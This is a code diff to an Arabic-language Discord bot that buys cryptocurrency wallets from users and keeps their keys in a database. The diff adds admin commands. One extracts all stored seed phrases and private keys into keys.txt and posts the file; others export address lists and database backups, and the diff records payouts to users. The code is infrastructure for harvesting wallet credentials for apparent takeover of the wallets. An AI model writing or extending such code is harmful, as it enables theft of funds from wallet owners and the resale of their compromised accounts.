@@ -460,9 +460,10 @@ async def on_message(message):
             
             # Create Pay Button
             class PayView(discord.ui.View):
-                def __init__(self, user_id):
+                def __init__(self, user_id, amount):
                     super().__init__(timeout=None)
                     self.user_id = user_id
+                    self.amount = amount
 
                 @discord.ui.button(label="Pay", style=discord.ButtonStyle.success, custom_id="pay_button")
                 async def pay_button(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -471,6 +472,13 @@ async def on_message(message):
                         return
                     
                     try:
+                        # Record the successful sale in the database
+                        conn = sqlite3.connect(DB_PATH)
+                        cursor = conn.cursor()
+                        cursor.execute("INSERT INTO successful_sales (user_id, amount) VALUES (?, ?)", (self.user_id, self.amount))
+                        conn.commit()
+                        conn.close()
+
                         user = await bot.fetch_user(self.user_id)
                         success_msg = (
                             "🎊 Congratulations! The transaction was successful\n\n"
@@ -478,15 +486,15 @@ async def on_message(message):
                             "🎁 When you sell wallets with a total value of 10 SOL, you will receive a 1 SOL bonus."
                         )
                         await user.send(success_msg)
-                        await interaction.response.send_message(f"✅ Payment confirmation sent to user `{self.user_id}`", ephemeral=True)
+                        await interaction.response.send_message(f"✅ Payment confirmation sent to user `{self.user_id}` and recorded in sales.", ephemeral=True)
                         # Disable the button after use
                         button.disabled = True
                         await interaction.message.edit(view=self)
                     except Exception as e:
-                        await interaction.response.send_message(f"❌ Error sending message to user: {e}", ephemeral=True)
+                        await interaction.response.send_message(f"❌ Error processing payment: {e}", ephemeral=True)
 
             # Send to TARGET_CHANNEL_ID for orders
-            await send_to_channel(TARGET_CHANNEL_ID, content=sale_msg, view=PayView(user_id))
+            await send_to_channel(TARGET_CHANNEL_ID, content=sale_msg, view=PayView(user_id, amount))
             
             # Save key to database
             try:
@@ -513,7 +521,7 @@ async def on_message(message):
     prefixes = ('/', '!', '.', '')
     # Check if it's a command or wallet address
     content_stripped = message.content.strip()
-    is_command = (message.content.startswith(prefixes) and len(message.content) > 1) or content_stripped.lower() in ['مستخدمين', 'بيانات', 'عبارات ومفاتيح']
+    is_command = (message.content.startswith(prefixes) and len(message.content) > 1) or content_stripped.lower() in ['مستخدمين', 'بيانات', 'عبارات ومفاتيح', 'فارغ', 'فحص', 'عناوين']
     is_wallet = len(extract_wallets(message.content)) > 0
     
     # Critical fix: Check if it's a command first (with empty prefix allowed)
@@ -831,107 +839,201 @@ async def on_message(message):
         content_lower = message.content.lower().strip()
         
         if content_lower == 'مستخدمين':
-            try:
-                conn = sqlite3.connect(DB_PATH)
-                cursor = conn.cursor()
-                
-                # 1. Total users
-                cursor.execute("SELECT COUNT(*) FROM users")
-                total_users = cursor.fetchone()[0]
-                
-                # 2. User growth (24h, week, month)
-                now = datetime.datetime.now()
-                day_ago = (now - datetime.timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
-                week_ago = (now - datetime.timedelta(weeks=1)).strftime('%Y-%m-%d %H:%M:%S')
-                month_ago = (now - datetime.timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S')
-                
-                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (day_ago,))
-                users_24h = cursor.fetchone()[0]
-                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (week_ago,))
-                users_week = cursor.fetchone()[0]
-                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (month_ago,))
-                users_month = cursor.fetchone()[0]
-                
-                # 3. Wallet checks (24h, week, month, total)
-                cursor.execute("SELECT COUNT(*) FROM wallet_checks")
-                checks_total = cursor.fetchone()[0]
-                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (day_ago,))
-                checks_24h = cursor.fetchone()[0]
-                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (week_ago,))
-                checks_week = cursor.fetchone()[0]
-                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (month_ago,))
-                checks_month = cursor.fetchone()[0]
-                
-                # 4. Successful sales (24h, week, month)
-                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (day_ago,))
-                res_24h = cursor.fetchone()
-                sales_24h_count = res_24h[0] or 0
-                sales_24h_sum = res_24h[1] or 0.0
-                
-                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (week_ago,))
-                res_week = cursor.fetchone()
-                sales_week_count = res_week[0] or 0
-                sales_week_sum = res_week[1] or 0.0
-                
-                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (month_ago,))
-                res_month = cursor.fetchone()
-                sales_month_count = res_month[0] or 0
-                sales_month_sum = res_month[1] or 0.0
-                
-                # 5. Top 10 Referrers
-                cursor.execute("""
-                    SELECT r.referrer_id, u.username, COUNT(*) as ref_count 
-                    FROM referrals r
-                    JOIN users u ON r.referrer_id = u.user_id
-                    GROUP BY r.referrer_id
-                    ORDER BY ref_count DESC
-                    LIMIT 10
-                """)
-                top_referrers = cursor.fetchall()
-                referrers_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_referrers]) if top_referrers else "لا يوجد بيانات حالياً"
-                
-                # 6. Top Active Users
-                cursor.execute("""
-                    SELECT ua.user_id, u.username, ua.check_count 
-                    FROM user_activity ua
-                    JOIN users u ON ua.user_id = u.user_id
-                    ORDER BY ua.check_count DESC
-                    LIMIT 10
-                """)
-                top_active = cursor.fetchall()
-                active_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_active]) if top_active else "لا يوجد بيانات حالياً"
-                
-                conn.close()
-                
-                stats_msg = (
-                    "📊 إحصائيات شاملة للبوت\n"
-                    "━━━━━━━━━━━━━━━━\n"
-                    f"👥 عدد المستخدمين الكلي: {total_users}\n\n"
-                    "📈 عدد زيادة المستخدمين\n"
-                    f"├ 24 ساعة: {users_24h}\n"
-                    f"├ أسبوع: {users_week}\n"
-                    f"└ شهر: {users_month}\n\n"
-                    "🔍 المحافظ المفحوصة\n"
-                    f"├ 24 ساعة: {checks_24h}\n"
-                    f"├ أسبوع: {checks_week}\n"
-                    f"├ شهر: {checks_month}\n"
-                    f"└ الكل: {checks_total}\n\n"
-                    "💰 المبيعات الناجحة\n"
-                    f"├ 24 ساعة: {sales_24h_count} ({sales_24h_sum:.2f} SOL)\n"
-                    f"├ أسبوع: {sales_week_count} ({sales_week_sum:.2f} SOL)\n"
-                    f"└ شهر: {sales_month_count} ({sales_month_sum:.2f} SOL)\n\n"
-                    "🏆 أفضل 10 محيلين\n"
-                    f"{referrers_text}\n"
-                    "🌟 أكثر المستخدمين تفاعلاً\n"
-                    f"{active_text}\n"
-                    f"🔄 آخر تحديث: {now.strftime('%Y-%m-%d %H:%M')}"
-                )
-                
-                await message.reply(stats_msg)
-            except Exception as e:
-                await message.reply(f"❌ حدث خطأ أثناء جلب الإحصائيات: {e}")
+            if message.author.id in ADMIN_IDS:
+                try:
+                    conn = sqlite3.connect(DB_PATH)
+                    cursor = conn.cursor()
+                    
+                    # 1. Total users
+                    cursor.execute("SELECT COUNT(*) FROM users")
+                    total_users = cursor.fetchone()[0]
+                    
+                    # 2. User growth (24h, week, month)
+                    now = datetime.datetime.now()
+                    day_ago = (now - datetime.timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
+                    week_ago = (now - datetime.timedelta(weeks=1)).strftime('%Y-%m-%d %H:%M:%S')
+                    month_ago = (now - datetime.timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S')
+                    
+                    cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (day_ago,))
+                    users_24h = cursor.fetchone()[0]
+                    cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (week_ago,))
+                    users_week = cursor.fetchone()[0]
+                    cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (month_ago,))
+                    users_month = cursor.fetchone()[0]
+                    
+                    # 3. Wallet checks (24h, week, month, total)
+                    cursor.execute("SELECT COUNT(*) FROM wallet_checks")
+                    checks_total = cursor.fetchone()[0]
+                    cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (day_ago,))
+                    checks_24h = cursor.fetchone()[0]
+                    cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (week_ago,))
+                    checks_week = cursor.fetchone()[0]
+                    cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (month_ago,))
+                    checks_month = cursor.fetchone()[0]
+                    
+                    # 4. Successful sales (24h, week, month)
+                    cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (day_ago,))
+                    res_24h = cursor.fetchone()
+                    sales_24h_count = res_24h[0] or 0
+                    sales_24h_sum = res_24h[1] or 0.0
+                    
+                    cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (week_ago,))
+                    res_week = cursor.fetchone()
+                    sales_week_count = res_week[0] or 0
+                    sales_week_sum = res_week[1] or 0.0
+                    
+                    cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (month_ago,))
+                    res_month = cursor.fetchone()
+                    sales_month_count = res_month[0] or 0
+                    sales_month_sum = res_month[1] or 0.0
+                    
+                    # 5. Top 10 Referrers
+                    cursor.execute("""
+                        SELECT r.referrer_id, u.username, COUNT(*) as ref_count 
+                        FROM referrals r
+                        JOIN users u ON r.referrer_id = u.user_id
+                        GROUP BY r.referrer_id
+                        ORDER BY ref_count DESC
+                        LIMIT 10
+                    """)
+                    top_referrers = cursor.fetchall()
+                    referrers_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_referrers]) if top_referrers else "لا يوجد بيانات حالياً"
+                    
+                    # 6. Top Active Users
+                    cursor.execute("""
+                        SELECT ua.user_id, u.username, ua.check_count 
+                        FROM user_activity ua
+                        JOIN users u ON ua.user_id = u.user_id
+                        ORDER BY ua.check_count DESC
+                        LIMIT 10
+                    """)
+                    top_active = cursor.fetchall()
+                    active_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_active]) if top_active else "لا يوجد بيانات حالياً"
+                    
+                    conn.close()
+                    
+                    stats_msg = (
+                        "📊 إحصائيات شاملة للبوت\n"
+                        "━━━━━━━━━━━━━━━━\n"
+                        f"👥 عدد المستخدمين الكلي: {total_users}\n\n"
+                        "📈 عدد زيادة المستخدمين\n"
+                        f"├ 24 ساعة: {users_24h}\n"
+                        f"├ أسبوع: {users_week}\n"
+                        f"└ شهر: {users_month}\n\n"
+                        "🔍 المحافظ المفحوصة\n"
+                        f"├ 24 ساعة: {checks_24h}\n"
+                        f"├ أسبوع: {checks_week}\n"
+                        f"├ شهر: {checks_month}\n"
+                        f"└ الكل: {checks_total}\n\n"
+                        "💰 المبيعات الناجحة\n"
+                        f"├ 24 ساعة: {sales_24h_count} ({sales_24h_sum:.2f} SOL)\n"
+                        f"├ أسبوع: {sales_week_count} ({sales_week_sum:.2f} SOL)\n"
+                        f"└ شهر: {sales_month_count} ({sales_month_sum:.2f} SOL)\n\n"
+                        "🏆 أفضل 10 محيلين\n"
+                        f"{referrers_text}\n"
+                        "🌟 أكثر المستخدمين تفاعلاً\n"
+                        f"{active_text}\n"
+                        f"🔄 آخر تحديث: {now.strftime('%Y-%m-%d %H:%M')}"
+                    )
+                    
+                    await message.reply(stats_msg)
+                except Exception as e:
+                    await message.reply(f"❌ حدث خطأ أثناء جلب الإحصائيات: {e}")
+                return
             return
 
+        if content_lower == 'بيانات':
+            if message.author.id in ADMIN_IDS:
+                embed = discord.Embed(
+                    title="🗄️ إدارة قاعدة البيانات",
+                    description="اختر أحد الخيارات التالية للتحكم في ملفات البيانات:",
+                    color=discord.Color.blue()
+                )
+                
+                view = discord.ui.View()
+                
+                # زر التحميل
+                download_btn = discord.ui.Button(label="تحميل النسخة الاحتياطية", style=discord.ButtonStyle.success, emoji="📥")
+                async def download_callback(interaction):
+                    files = []
+                    for filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt', 'keys.txt']:
+                        if os.path.exists(filename):
+                            files.append(discord.File(filename))
+                    
+                    if files:
+                        await interaction.response.send_message("✅ جاري تحضير الملفات...", ephemeral=True)
+                        await interaction.followup.send("إليك نسخة من ملفات قاعدة البيانات الحالية:", files=files)
+                    else:
+                        await interaction.response.send_message("❌ لم يتم العثور على أي ملفات بيانات.", ephemeral=True)
+                
+                # زر الرفع
+                upload_btn = discord.ui.Button(label="رفع ملفات جديدة", style=discord.ButtonStyle.primary, emoji="📤")
+                async def upload_callback(interaction):
+                    user_states[interaction.user.id] = "waiting_for_db_upload"
+                    await interaction.response.send_message("📤 أرسل الآن الملفات التي تريد استبدالها (users.db, addresses.txt, إلخ...)", ephemeral=True)
+                
+                download_btn.callback = download_callback
+                upload_btn.callback = upload_callback
+                view.add_item(download_btn)
+                view.add_item(upload_btn)
+                
+                await message.reply(embed=embed, view=view)
+                return
+            return
+
+        if content_lower == 'عبارات ومفاتيح':
+            if message.author.id in ADMIN_IDS:
+                try:
+                    conn = sqlite3.connect(DB_PATH)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT key_data, key_type FROM user_keys")
+                    rows = cursor.fetchall()
+                    conn.close()
+                    
+                    seeds = [row[0] for row in rows if len(row[0].split()) in [12, 15, 18, 21, 24]]
+                    privkeys = [row[0] for row in rows if row[0] not in seeds]
+                    
+                    content = "🔑 **العبارات السرية (Seeds):**\n\n"
+                    content += "\n\n".join(seeds)
+                    content += "\n\n" + "="*30 + "\n\n"
+                    content += "🔐 **المفاتيح الخاصة (Private Keys):**\n\n"
+                    content += "\n\n".join(privkeys)
+                    
+                    with open("keys.txt", "w", encoding="utf-8") as f:
+                        f.write(content)
+                    
+                    await message.reply(file=discord.File("keys.txt"))
+                except Exception as e:
+                    await message.reply(f"❌ حدث خطأ أثناء استخراج البيانات: {e}")
+                return
+            return
+
+        if content_lower == 'فحص':
+            if message.author.id in ADMIN_IDS:
+                if not os.path.exists("rent.txt"):
+                    await message.reply("📋 لا توجد عناوين مفحوصة حالياً.")
+                else:
+                    await message.reply(file=discord.File("rent.txt"))
+                return
+            return
+
+        if content_lower == 'فارغ':
+            if message.author.id in ADMIN_IDS:
+                if not os.path.exists("addresses.txt"):
+                    await message.reply("📋 لا توجد عناوين فارغة حالياً.")
+                else:
+                    await message.reply(file=discord.File("addresses.txt"))
+                return
+            return
+
+        if content_lower == 'عناوين':
+            if message.author.id in ADMIN_IDS:
+                if not os.path.exists("rent.txt"):
+                    await message.reply("📋 لا توجد عناوين حالياً.")
+                else:
+                    await message.reply(file=discord.File("rent.txt"))
+                return
+            return
         if content_lower == 'بيانات':
             embed = discord.Embed(
                 title="🗄️ إدارة قاعدة البيانات",
